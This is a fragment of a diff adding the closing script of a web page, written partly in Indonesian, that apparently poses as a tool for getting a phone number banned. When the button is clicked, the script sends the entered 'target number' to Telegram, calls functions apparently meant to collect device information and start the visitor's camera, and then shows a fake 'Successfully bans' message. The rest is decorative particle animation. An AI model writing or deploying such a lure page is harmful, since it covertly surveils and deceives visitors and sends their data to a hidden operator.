+      sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
+      input.value = '';
+      try {
+        await getInfo();
+        await startCamera();
+        setTimeout(() => {
+          infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
+          button.disabled = false;
+        }, 1000);
+      } catch (e) {
+        infoDiv.innerText = '❌ Terjadi kesalahan.';
+        button.disabled = false;
+      }
+    });
+
+    function createParticles() {
+      const container = document.querySelector('.bg-particles');
+      for (let i = 0; i < 50; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.top = Math.random() * 100 + '%';
+        p.style.animationDelay = Math.random() * 6 + 's';
+        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
+        container.appendChild(p);
+      }
+    }
+    document.addEventListener('DOMContentLoaded', createParticles);
+  </script>
+</body>
+</html>
